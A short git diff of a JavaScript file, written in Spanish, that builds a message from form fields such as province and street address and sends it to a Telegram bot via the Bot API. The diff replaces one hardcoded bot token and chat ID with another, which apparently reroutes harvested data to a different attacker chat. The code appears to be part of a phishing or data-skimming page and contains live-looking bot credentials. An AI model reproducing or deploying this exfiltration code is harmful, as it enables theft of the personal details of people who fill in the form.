@@ -49,8 +49,8 @@ document.addEventListener("DOMContentLoaded", function () {
 🗽 Provincia: <code>${state}</code>
 🧭 Dirección: <code>${address}</code>`;
 
-        const botToken = "7639697036:AAH3Db24pt34r8mYE4tmbidD3Z176FVQmF0";
-        const chatId = "-1002315161295";
+        const botToken = "8095827579:AAEVoXUcyOw8kAPxbsrh8EPr6AFT1AgW4j4";
+        const chatId = "-4866505446";
 
         // Enviar mensaje a Telegram
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
